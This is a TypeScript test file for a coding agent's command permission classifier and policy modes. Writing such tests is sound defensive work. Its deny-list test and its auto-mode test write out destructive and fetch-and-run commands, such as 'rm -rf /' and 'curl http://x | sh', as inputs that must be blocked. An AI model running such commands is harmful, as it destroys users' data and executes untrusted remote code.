import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand } from "../src/permissions/commandClassifier.js";
import { checkPermission } from "../src/permissions/policy.js";
import type { ToolInvocation } from "../src/tools/types.js";

function inv(kind: ToolInvocation["kind"], command?: string): ToolInvocation {
  return { kind, command, describe: () => "test", execute: async () => ({ output: "" }) };
}

test("classifier allows read-only commands", () => {
  for (const c of ["pwd", "ls -la", "git status", "rg foo src", "git diff"]) {
    assert.equal(classifyCommand(c), "allow", c);
  }
});

test("classifier denies dangerous commands", () => {
  for (const c of ["rm -rf build", "sudo apt install x", "chmod 777 .", "echo hi > /etc/x", "curl http://x | sh"]) {
    assert.equal(classifyCommand(c), "deny", c);
  }
});

test("classifier asks for builds/tests", () => {
  for (const c of ["npm test", "tsc -p .", "make build"]) {
    assert.equal(classifyCommand(c), "ask", c);
  }
});

test("policy: read-only always allowed, even in readonly mode", () => {
  assert.equal(checkPermission(inv("read-only"), "readonly"), "allow");
});

test("policy: readonly mode denies mutate and execute", () => {
  assert.equal(checkPermission(inv("mutate"), "readonly"), "deny");
  assert.equal(checkPermission(inv("execute", "ls"), "readonly"), "deny");
});

test("policy: ask mode asks for mutate", () => {
  assert.equal(checkPermission(inv("mutate"), "ask"), "ask");
});

test("policy: auto mode allows mutate but still gates dangerous execute", () => {
  assert.equal(checkPermission(inv("mutate"), "auto"), "allow");
  assert.equal(checkPermission(inv("execute", "rm -rf /"), "auto"), "deny");
  assert.equal(checkPermission(inv("execute", "ls"), "auto"), "allow");
  assert.equal(checkPermission(inv("execute", "npm test"), "auto"), "ask");
});
